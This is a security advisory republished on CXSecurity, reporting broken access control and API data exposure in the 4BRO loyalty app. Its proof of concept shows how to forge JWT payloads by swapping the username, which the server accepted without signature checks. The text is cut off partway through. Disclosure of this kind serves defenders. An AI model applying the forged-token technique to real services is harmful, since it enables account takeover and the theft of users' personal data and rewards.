---
title: 4BRO Insecure Direct Object Reference / API Information Exposure
url: https://cxsecurity.com/issue/WLB-2024050073
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-05-25
fetch_date: 2025-10-06T17:14:36.669445
---

# 4BRO Insecure Direct Object Reference / API Information Exposure

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **4BRO Insecure Direct Object Reference / API Information Exposure** **2024.05.24**  Credit:  **[Max Rull](https://cxsecurity.com/author/Max%2BRull/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

SEC Consult Vulnerability Lab Security Advisory < 20240522-0 >
=======================================================================
title: Broken access control & API Information Exposure
product: 4BRO App
vulnerable version: before 2024-04-17
fixed version: 2024-04-17
CVE number: -
impact: Critical
homepage: https://www.4bro.de
found: 2023-05-07
by: Max Rull (Office Bochum)
SEC Consult Vulnerability Lab
An integrated part of SEC Consult, an Eviden business
Europe | Asia
https://www.sec-consult.com
=======================================================================
Vendor description:
-------------------
"4BRO is a German company known for producing iced tea beverages. The brand offers
a variety of flavors, including unique combinations such as peach, bubblegum,
and watermelon mint. 4BRO emphasizes modern and appealing packaging, targeting
a younger demographic. The company promotes its products through various platforms
and incentivizes customer loyalty with their app, which allows users to collect
points for rewards. The company's headquarters is located in Germany, and their
products are widely available both online and in retail stores."
Source: https://www.4bro.de
Business recommendation:
------------------------
The vendor has fixed the security issues in the API server as of 2024-04-17.
SEC Consult highly recommends to perform a thorough security review of the product
conducted by security professionals to identify and resolve potential further
security issues.
Vulnerability overview/description:
-----------------------------------
1) Broken access control via IDOR in 4BRO app API
An IDOR vulnerability (Insecure Direct Object Reference) allows an attacker
to change the username in the Bearer token used for authentication in the 4BRO app.
This leads to account takeover as a result of broken access control (poor Bearer
token verification). Attackers are able to access all data or Bro points ("broins")
from other users.
2) API Information Exposure
When opening the app as an unauthenticated user, the 4BRO app loads JSON data
from a publicly available API endpoint containing sensitive data like e-mail
addresses of employees, internal invoices, a CV including personal information,
a gift card etc.
Proof of concept:
-----------------
1) Broken access control via IDOR in 4BRO app API
When logging in into the 4BRO app, the server returns a JWT (JSON Web Token).
The "login" HTTP request looks like this:
--------------------------------------------------------------------------------
POST /api/user/signin HTTP/2
Host: adminpanel.4bro.de
Content-Type: application/json
[...]
{"email":"<login email>","password":"<login password>"}
--------------------------------------------------------------------------------
The server responds with a JWT used for authentication and additional
account-related data:
--------------------------------------------------------------------------------
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
[...]
{
"token": "<JWT here>",
"userData": {
"isBlocked": false,
"\_id": "[...]",
"userType": "USER",
"email": "<login email>",
"broins": 0,
"deviceId": null,
"userCreationDate": "2023-XX-XXTXX:XX:XX.XXXZ",
"address": [{
"\_id": "[...]",
"streetName": "[...]",
"streetNumber": "[...]",
"postalcode": "[...]",
"city": "[...]",
"firstName": "[...]",
"lastName": "[...]",
"country": "at"
}
],
"ratings": [],
"\_\_v": 0,
"pushToken": "[...]",
"telekomUUID": "[...]"
}
}
--------------------------------------------------------------------------------
Because the JWT is only base64-encoded, it is easy to decode the JWT's
header and payload as clear text using JWT decoders like https://token.dev/:
--------------------------------------------------------------------------------
Header:
{
"kid": "[...]",
"alg": "RS256"
}
--------------------------------------------------------------------------------
Payload:
{
"sub": "[...]",
"event\_id": "[...]",
"token\_use": "access",
"scope": "aws.cognito.signin.user.admin",
"auth\_time": 1683565567,
"iss": "https://cognito-idp.eu-central-1.amazonaws.com/[...]",
"exp": 1683569167,
"iat": 1683565567,
"jti": "[...]",
"client\_id": "[...]",
"username": "<login email>"
}
--------------------------------------------------------------------------------
The payload of the JWT contains multiple values indicating that AWS Cognito is in use.
By changing the "username" value of the JWT payload to a victim email, it is possible
to use the modified JWT for authenticating as the victim. The victim should already
have a normally registered account in the 4BRO app. By trial and error, it turns out
that even the following modified JWT payload gets accepted by the server:
--------------------------------------------------------------------------------
{
"sub": "0",
"event\_id": "0",
"token\_use": "access",
"scope": "aws.cognito.signin.user.admin",
"auth\_time": 0,
"iss": "",
"exp": 0,
"iat": 0,
"jti": "0",
"client\_id": "0",
"username": "<login email>"
}
--------------------------------------------------------------------------------
Meanwhile, the "kid" property in the JWT header must be a valid value, but can belong
to any other already existing 4BRO app account. The JWT signature can be the same
and does not get verified at all.
Using the modified JWT, all API methods supported by the 4BRO app can be executed.
Because the server only checks the "username" property in the JWT payload and does
slim to none JWT verification, the server thinks that the request came from the
account associated with the login email contained in the "username" property.
This way, sensitive data such as the current "broin" balance, full user data as seen
in the login response, previous transactions, redeemed vouchers and goodies etc.
can be accessed without restrictions, using the 4BRO API. Also, the "sending broins"
action can ...